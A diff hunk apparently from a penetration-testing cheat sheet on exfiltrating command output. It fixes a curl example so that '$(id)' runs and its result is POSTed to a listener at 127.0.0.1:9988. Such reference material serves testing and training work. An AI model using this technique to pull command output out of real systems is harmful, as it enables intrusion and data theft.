@@ -2003,7 +2003,7 @@ You can specify a number of pings with -c agrments, If ICMP requests recieved, R
 ## Curl
 Execute commands and recieve data with the POST request
 ```bash
-curl -d '$(id)' 127.0.0.1:9988
+curl -d "$(id)" 127.0.0.1:9988
 ```
 Recieve data
 ```bash
